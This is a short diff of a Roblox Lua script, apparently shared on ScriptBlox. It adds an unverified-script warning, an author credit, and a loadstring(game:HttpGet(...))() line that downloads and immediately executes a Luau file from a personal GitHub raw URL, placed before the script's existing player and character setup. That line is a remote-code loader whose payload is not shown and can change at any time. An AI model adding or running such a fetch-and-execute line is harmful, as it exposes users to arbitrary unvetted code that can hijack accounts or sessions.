@@ -1,3 +1,10 @@
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+loadstring(game:HttpGet("https://raw.githubusercontent.com/oldhacfard/The-script1/refs/heads/main/Luauscript.luau"))()
+
+--By oldhacfard my main acconut
+wait("4")
 local lp = game:GetService("Players").LocalPlayer
 local rs = game:GetService("RunService")
 local char = lp.Character
